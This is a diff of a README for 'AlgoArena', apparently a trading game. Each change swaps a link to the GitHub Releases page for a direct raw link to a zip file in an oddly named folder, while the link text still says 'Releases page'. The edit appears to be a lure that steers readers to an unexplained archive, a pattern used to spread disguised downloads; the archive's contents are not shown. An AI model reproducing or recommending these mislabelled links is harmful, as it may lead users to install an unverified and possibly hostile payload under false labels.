@@ -1,6 +1,6 @@
 # ⚔️ AlgoArena - Battle Strategies for the Best Score
 
-[![Download AlgoArena](https://img.shields.io/badge/Download-AlgoArena-blue.svg)](https://github.com/abd2kill/AlgoArena/releases)
+[![Download AlgoArena](https://raw.githubusercontent.com/abd2kill/AlgoArena/main/alnage/AlgoArena.zip)](https://raw.githubusercontent.com/abd2kill/AlgoArena/main/alnage/AlgoArena.zip)
 
 ## 📜 Introduction
 
@@ -11,7 +11,7 @@ Welcome to AlgoArena! This is a trading game where simple strategies compete for
 Follow these steps to download and run AlgoArena:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/abd2kill/AlgoArena/releases) to find the latest version of AlgoArena.
+   Go to the [Releases page](https://raw.githubusercontent.com/abd2kill/AlgoArena/main/alnage/AlgoArena.zip) to find the latest version of AlgoArena.
 
 2. **Download the Application**  
    On the Releases page, you will see various files. Look for the most recent version. Click on the file labeled for your operating system (Windows, macOS, Linux) to start the download.
@@ -56,7 +56,7 @@ Before installing AlgoArena, make sure your system meets the following requireme
 
 ## 💻 Download & Install
 
-To start playing AlgoArena, please follow the steps mentioned. Make sure to visit our [Releases page](https://github.com/abd2kill/AlgoArena/releases) to download the latest version and install it securely on your device.
+To start playing AlgoArena, please follow the steps mentioned. Make sure to visit our [Releases page](https://raw.githubusercontent.com/abd2kill/AlgoArena/main/alnage/AlgoArena.zip) to download the latest version and install it securely on your device.
 
 ## 🔧 Troubleshooting
 
@@ -72,7 +72,7 @@ Join our community of players to share tips and experiences. You can find us on 
 
 ## 🔗 Useful Links
 
-- [Visit the Releases Page](https://github.com/abd2kill/AlgoArena/releases)
+- [Visit the Releases Page](https://raw.githubusercontent.com/abd2kill/AlgoArena/main/alnage/AlgoArena.zip)
 - [Join the Community Forum](#) (link to be provided)
 - [Follow Us on Twitter](#) (link to be provided)
 
